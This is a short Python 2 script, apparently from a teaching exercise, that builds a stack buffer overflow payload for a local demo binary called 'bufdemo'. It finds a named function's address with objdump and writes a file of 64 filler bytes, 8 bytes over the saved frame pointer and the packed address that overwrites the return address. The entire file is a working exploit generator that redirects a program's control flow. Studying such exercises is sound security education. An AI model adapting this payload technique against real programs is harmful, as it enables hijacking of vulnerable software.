#!/usr/bin/python

import commands, struct, sys


def gen_exploit(func_name, file_name):
    (ret, out) = commands.getstatusoutput("objdump -t bufdemo | grep \" %s\"" % func_name)
    addr = int("0x" + out.split(" ")[0], 16)
    print "Found %s at addr %s. Writing code to 'exploit_1'" % (func_name, hex(addr))

    with open(file_name,"w") as f:
        # Fill the buffer
        f.write("A"*64)
        # Fill RBP
        f.write("B"*8)
        # Overwrite return address with addr
        f.write(struct.pack("q", addr))




if len(sys.argv) < 3:
    print "Usage: %s function_name exploit_output_filename"
    print "Assumes binary is in 'bufdemo'"
    sys.exit(1)

gen_exploit(sys.argv[1], sys.argv[2])
